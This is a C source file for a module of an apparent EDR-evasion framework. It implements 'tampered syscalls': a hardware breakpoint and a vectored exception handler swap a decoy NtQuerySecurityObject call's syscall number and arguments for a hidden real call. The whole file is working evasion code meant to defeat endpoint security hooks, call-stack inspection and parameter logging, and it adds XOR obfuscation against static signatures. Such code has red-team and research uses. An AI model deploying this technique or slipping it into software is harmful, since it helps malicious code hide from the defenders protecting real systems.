/*
 * edr-tekton :: Tampered Syscall Module
 * Cat 2.14: Hardware breakpoint-based SSN swapping (@rad9800 technique)
 *
 * Uses a decoy syscall (NtQuerySecurityObject) as the visible call.
 * Hardware breakpoint fires at the `syscall` instruction, VEH handler
 * swaps Rax (SSN) and arguments (R10, Rdx, R8, R9) to the real target.
 *
 * Result: call stack shows a call to NtQuerySecurityObject (benign),
 * but the actual syscall executed is the one we want. Return address
 * points to legitimate ntdll code. Arguments never appear in plaintext
 * in the original call site.
 *
 * Combines the stack-legitimacy of indirect syscalls with argument-level
 * redirection that defeats parameter logging.
 */

#include "tekton/modules/syscall.h"
#include "tekton/util/peb.h"
#include "tekton/util/pe.h"
#include "tekton/util/hash.h"
#include "tekton/core/log.h"
#include <string.h>
#include <stdlib.h>

/* ── Internal state ─────────────────────────────────────── */

/*
 * Tamper context: holds the real SSN and arguments that the VEH
 * handler will swap in when the hardware breakpoint fires.
 */
typedef struct _TAMPER_ARGS {
    DWORD   real_ssn;       /* Actual SSN to execute          */
    DWORD   arg_count;      /* Number of arguments            */
    PVOID   arg1;           /* R10 (rcx shadow)               */
    PVOID   arg2;           /* Rdx                            */
    PVOID   arg3;           /* R8                             */
    PVOID   arg4;           /* R9                             */
    /* Args 5+ go on the stack, handled separately */
} TAMPER_ARGS;

typedef struct _TAMPERED_SYSCALL_STATE {
    BOOL                initialized;
    TEKTON_SSN_METHOD   ssn_method;
    PVOID               ntdll_base;

    /* Decoy function: NtQuerySecurityObject */
    PVOID               decoy_func;         /* Address of NtQuerySecurityObject */
    DWORD               decoy_ssn;          /* SSN for the decoy               */
    PVOID               syscall_instr;      /* Address of `syscall` in decoy stub */

    /* XOR key for obfuscating syscall bytes in binary (Cat 2.14) */
    WORD                syscall_xor_key;

    /* Thread-local tamper args (single-threaded for now) */
    TAMPER_ARGS         pending_tamper;
    BOOL                tamper_armed;

    /* VEH handle */
    PVOID               veh_handle;
} TAMPERED_SYSCALL_STATE;

/* Global pointer for VEH callback access (VEH has no user context param) */
static TAMPERED_SYSCALL_STATE* g_tampered_state = NULL;

/* Forward declarations */
extern TEKTON_STATUS TektonSsnResolve(PVOID, TEKTON_SSN_METHOD, PTEKTON_RESOLVED_STATE);

/* ── VEH Handler ───────────────────────────────────────── */
/*
 * When the hardware breakpoint fires at the `syscall` instruction,
 * this handler swaps the registers:
 *   Rax <- real SSN (instead of decoy SSN)
 *   R10 <- real arg1 (instead of decoy arg1)
 *   Rdx <- real arg2
 *   R8  <- real arg3
 *   R9  <- real arg4
 *
 * Then sets the Resume Flag (RF, bit 16) in EFLAGS so the breakpoint
 * does not re-fire on the same instruction.
 */

#ifdef _WIN32
static LONG NTAPI TamperedVehHandler(PEXCEPTION_POINTERS pExInfo) {
    if (!g_tampered_state || !g_tampered_state->tamper_armed) {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    if (pExInfo->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP) {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    PCONTEXT ctx = pExInfo->ContextRecord;

    /* Verify the break is at our expected syscall instruction address */
    if ((PVOID)ctx->Rip != g_tampered_state->syscall_instr) {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    TAMPER_ARGS* args = &g_tampered_state->pending_tamper;

    /* Swap SSN: Rax holds the decoy SSN, replace with real */
    ctx->Rax = (DWORD64)args->real_ssn;

    /* Swap arguments per Windows x64 syscall convention */
    ctx->R10 = (DWORD64)args->arg1;     /* First arg (rcx shadowed to r10) */
    ctx->Rdx = (DWORD64)args->arg2;
    ctx->R8  = (DWORD64)args->arg3;
    ctx->R9  = (DWORD64)args->arg4;

    /* Set Resume Flag so breakpoint does not re-fire */
    ctx->EFlags |= (1 << 16);

    /* Disarm: one-shot per syscall invocation */
    g_tampered_state->tamper_armed = FALSE;

    return EXCEPTION_CONTINUE_EXECUTION;
}
#endif /* _WIN32 */

/* ── Hardware Breakpoint Management ────────────────────── */

/*
 * Install a hardware breakpoint on the current thread at `addr`.
 * Uses Dr0 (first debug register). Dr7 enables it.
 */
static BOOL install_hw_breakpoint(PVOID addr) {
#ifdef _WIN32
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    HANDLE hThread = GetCurrentThread();

    if (!GetThreadContext(hThread, &ctx)) {
        TLOG_ERROR("tampered: GetThreadContext failed");
        return FALSE;
    }

    /* Set Dr0 to target address */
    ctx.Dr0 = (DWORD64)addr;

    /* Enable Dr0 globally in Dr7:
     * Bit 1 = G0 (global enable for Dr0)
     * Bits 16-17 = condition for Dr0 (00 = execution)
     * Bits 18-19 = length for Dr0 (00 = 1 byte)
     */
    ctx.Dr7 &= ~(0xFULL << 16);    /* Clear condition/length bits for Dr0 */
    ctx.Dr7 |= (1ULL << 1);        /* Set G0: global enable for Dr0 */
    ctx.Dr6  = 0;                   /* Clear status register */

    if (!SetThreadContext(hThread, &ctx)) {
        TLOG_ERROR("tampered: SetThreadContext failed");
        return FALSE;
    }

    return TRUE;
#else
    (void)addr;
    TLOG_DEBUG("tampered: HW breakpoint stub (non-Windows)");
    return TRUE;
#endif
}

static BOOL remove_hw_breakpoint(void) {
#ifdef _WIN32
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    HANDLE hThread = GetCurrentThread();
    if (!GetThreadContext(hThread, &ctx)) return FALSE;

    ctx.Dr0 = 0;
    ctx.Dr7 &= ~(1ULL << 1);   /* Clear G0 */
    ctx.Dr6  = 0;

    return SetThreadContext(hThread, &ctx);
#else
    return TRUE;
#endif
}

/* ── Find syscall instruction in decoy stub ────────────── */
/*
 * Scan the decoy function's stub for the `syscall` instruction (0F 05).
 * The hardware breakpoint fires right here.
 *
 * For obfuscation (Cat 2.14 detail): the scanner can XOR the target
 * bytes to avoid static detection of the `0F 05` pattern in the binary.
 */

static PVOID find_syscall_instr_in_stub(PVOID func_addr, WORD xor_key) {
    if (!func_addr) return NULL;

    BYTE* stub = (BYTE*)func_addr;

    /*
     * Nt* stubs are ~0x20 bytes. Scan for `syscall` (0F 05).
     * With XOR obfuscation: the bytes 0x0F05 XOR'd with key.
     * We compare by XOR-ing the candidate back.
     */
    WORD target = 0x050F;   /* syscall opcode (little-endian as WORD) */

    for (int i = 0; i < 0x20; i++) {
        WORD candidate = *(WORD*)(stub + i);

        if (xor_key != 0) {
            candidate ^= xor_key;
        }

        if (candidate == target) {
            TLOG_TRACE("tampered: found syscall instruction at offset %d in stub", i);
            return stub + i;
        }
    }

    /* Direct scan without XOR as fallback */
    if (xor_key != 0) {
        for (int i = 0; i < 0x20; i++) {
            if (stub[i] == 0x0F && stub[i + 1] == 0x05) {
                return stub + i;
            }
        }
    }

    return NULL;
}

/* ── Resolve decoy SSN ─────────────────────────────────── */
/*
 * Read the SSN from the decoy stub using Hell's Gate pattern.
 * Decoy = NtQuerySecurityObject: a benign, commonly called function.
 */

static DWORD read_stub_ssn(PVOID func_addr) {
    if (!func_addr) return 0xFFFFFFFF;

    BYTE* stub = (BYTE*)func_addr;

    /* Standard stub: 4C 8B D1 B8 [SSN 4 bytes] */
    if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 && stub[3] == 0xB8) {
        return *(DWORD*)(stub + 4);
    }

    /* Hooked: the decoy function is hooked too. Try reading from bytes offset. */
    /* Some hooks preserve the mov eax instruction at a different offset */
    for (int i = 0; i < 0x18; i++) {
        if (stub[i] == 0xB8 && stub[i + 3] == 0x00 && stub[i + 4] == 0x00) {
            return *(DWORD*)(stub + i + 1);
        }
    }

    return 0xFFFFFFFF;
}

/* ── Module vtable implementation ───────────────────────── */

static TEKTON_STATUS tampered_init(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)ctx;

    TAMPERED_SYSCALL_STATE* state = (TAMPERED_SYSCALL_STATE*)malloc(sizeof(TAMPERED_SYSCALL_STATE));
    if (!state) return TEKTON_ERR_ALLOC;

    memset(state, 0, sizeof(*state));
    state->ssn_method = TEKTON_SSN_HALOS_GATE;
    state->syscall_xor_key = 0x2325;   /* XOR key for syscall byte obfuscation */

    self->private_data = state;
    g_tampered_state = state;

    TLOG_DEBUG("tampered_syscall: init");
    return TEKTON_OK;
}

static TEKTON_STATUS tampered_execute(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    TAMPERED_SYSCALL_STATE* state = (TAMPERED_SYSCALL_STATE*)self->private_data;
    if (!state) return TEKTON_ERR_INVALID_STATE;

    if (ctx->dry_run) {
        TLOG_INFO("tampered_syscall: [DRY RUN] would resolve SSNs + install HW breakpoint on decoy");
        return TEKTON_OK;
    }

    /* Step 1: Find ntdll base */
    PVOID ntdll_base = TektonPebGetModuleBase(L"ntdll.dll");
    if (!ntdll_base) {
        TLOG_ERROR("tampered_syscall: ntdll.dll not found");
        return TEKTON_ERR_API_RESOLVE;
    }
    state->ntdll_base = ntdll_base;

    /* Step 2: Resolve real SSNs for all target functions */
    TEKTON_STATUS status = TektonSsnResolve(ntdll_base, state->ssn_method, &ctx->resolved);
    if (status != TEKTON_OK) {
        TLOG_ERROR("tampered_syscall: SSN resolution failed");
        return status;
    }

    /* Step 3: Find and resolve the decoy function (NtQuerySecurityObject) */
    state->decoy_func = TektonPeFindExport(ntdll_base, "NtQuerySecurityObject");
    if (!state->decoy_func) {
        TLOG_ERROR("tampered_syscall: decoy function not found");
        return TEKTON_ERR_API_RESOLVE;
    }

    state->decoy_ssn = read_stub_ssn(state->decoy_func);
    if (state->decoy_ssn == 0xFFFFFFFF) {
        TLOG_ERROR("tampered_syscall: could not read decoy SSN");
        return TEKTON_ERR_API_RESOLVE;
    }

    TLOG_DEBUG("tampered_syscall: decoy NtQuerySecurityObject SSN = 0x%lX",
        (unsigned long)state->decoy_ssn);

    /* Step 4: Find the `syscall` instruction in the decoy stub */
    state->syscall_instr = find_syscall_instr_in_stub(state->decoy_func, 0);
    if (!state->syscall_instr) {
        TLOG_ERROR("tampered_syscall: syscall instruction not found in decoy stub");
        return TEKTON_ERR_NOT_FOUND;
    }

    /* Step 5: Register VEH (must be first handler to intercept breakpoints) */
#ifdef _WIN32
    state->veh_handle = AddVectoredExceptionHandler(1, TamperedVehHandler);
    if (!state->veh_handle) {
        TLOG_ERROR("tampered_syscall: AddVectoredExceptionHandler failed");
        return TEKTON_ERR_INIT_FAILED;
    }
#endif

    /* Step 6: Install hardware breakpoint at the syscall instruction */
    if (!install_hw_breakpoint(state->syscall_instr)) {
        TLOG_ERROR("tampered_syscall: hardware breakpoint installation failed");
#ifdef _WIN32
        RemoveVectoredExceptionHandler(state->veh_handle);
        state->veh_handle = NULL;
#endif
        return TEKTON_ERR_INIT_FAILED;
    }

    state->initialized = TRUE;

    TLOG_INFO("tampered_syscall: ready, decoy=%p, bp=%p, SSN=0x%lX",
        state->decoy_func, state->syscall_instr, (unsigned long)state->decoy_ssn);

    return TEKTON_OK;
}

static VOID tampered_cleanup(PTEKTON_MODULE self) {
    TAMPERED_SYSCALL_STATE* state = (TAMPERED_SYSCALL_STATE*)self->private_data;
    if (!state) return;

    /* Remove hardware breakpoint */
    remove_hw_breakpoint();

    /* Remove VEH */
#ifdef _WIN32
    if (state->veh_handle) {
        RemoveVectoredExceptionHandler(state->veh_handle);
    }
#endif

    /* Clear global pointer */
    g_tampered_state = NULL;

    TEKTON_SECURE_ZERO(state, sizeof(TAMPERED_SYSCALL_STATE));
    free(state);
    self->private_data = NULL;
}

static DWORD tampered_risk_score(PTEKTON_MODULE self) {
    (void)self;
    /* Very low: decoy call visible in stack, real SSN invisible to hooks */
    return 10;
}

static BOOL tampered_check_compat(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)self;
    /* x64 only: debug registers, syscall instruction, VEH */
    return ctx->os.is_x64;
}

/* ── Public: Execute a tampered syscall ────────────────── */
/*
 * Arms the VEH with the real SSN and arguments,
 * then calls the decoy function (NtQuerySecurityObject).
 * The hardware breakpoint fires at the `syscall` instruction,
 * VEH swaps the registers, and the real syscall executes.
 *
 * Thread safety: uses the global tampered state with
 * single-threaded assumption. For multi-threaded use,
 * wrap in a critical section (not implemented here to keep
 * the module simple, combine with Cat 2.11 for thread safety).
 */

NTSTATUS TektonTamperedSyscall(
    PTEKTON_CONTEXT ctx,
    DWORD           real_ssn,
    DWORD           arg_count,
    PVOID           arg1,
    PVOID           arg2,
    PVOID           arg3,
    PVOID           arg4
) {
    (void)ctx;

    if (!g_tampered_state || !g_tampered_state->initialized) {
        TLOG_ERROR("tampered_syscall: not initialized");
        return (NTSTATUS)0xC0000001;
    }

    /* Arm the tamper context */
    g_tampered_state->pending_tamper.real_ssn  = real_ssn;
    g_tampered_state->pending_tamper.arg_count = arg_count;
    g_tampered_state->pending_tamper.arg1      = arg1;
    g_tampered_state->pending_tamper.arg2      = arg2;
    g_tampered_state->pending_tamper.arg3      = arg3;
    g_tampered_state->pending_tamper.arg4      = arg4;
    g_tampered_state->tamper_armed             = TRUE;

    /*
     * Call the decoy function with dummy arguments.
     * NtQuerySecurityObject(NULL, 0, NULL, 0, NULL)
     * The VEH will intercept at the `syscall` instruction
     * and swap in our real SSN + arguments.
     */
#ifdef _WIN32
    typedef NTSTATUS (NTAPI *fn_NtQuerySecurityObject)(
        HANDLE, DWORD, PVOID, DWORD, PVOID
    );
    fn_NtQuerySecurityObject decoy =
        (fn_NtQuerySecurityObject)g_tampered_state->decoy_func;

    /* The return value comes from the REAL syscall (swapped by VEH) */
    NTSTATUS result = decoy(NULL, 0, NULL, 0, NULL);
    return result;
#else
    (void)arg_count;
    TLOG_DEBUG("TektonTamperedSyscall: non-Windows stub (SSN=0x%lX)", (unsigned long)real_ssn);
    g_tampered_state->tamper_armed = FALSE;
    return 0;
#endif
}

/* ── Module definition + auto-registration ──────────────── */

TEKTON_MODULE tekton_mod_tampered_syscall = {
    .name           = "tampered_syscall",
    .description    = "Tampered syscalls via HW breakpoint + VEH SSN swap (Cat 2.14, @rad9800)",
    .category       = TEKTON_CAT_SYSCALL,
    .target_surface = TEKTON_SURFACE_USER_HOOKS,
    .flags          = TEKTON_MOD_REQUIRES_X64 | TEKTON_MOD_STEALTHY,
    .skill_ref      = "2.14",
    .init           = tampered_init,
    .execute        = tampered_execute,
    .cleanup        = tampered_cleanup,
    .get_risk_score = tampered_risk_score,
    .check_compat   = tampered_check_compat,
    .private_data   = NULL,
    .next           = NULL,
};

TEKTON_DECLARE_MODULE(tekton_mod_tampered_syscall);
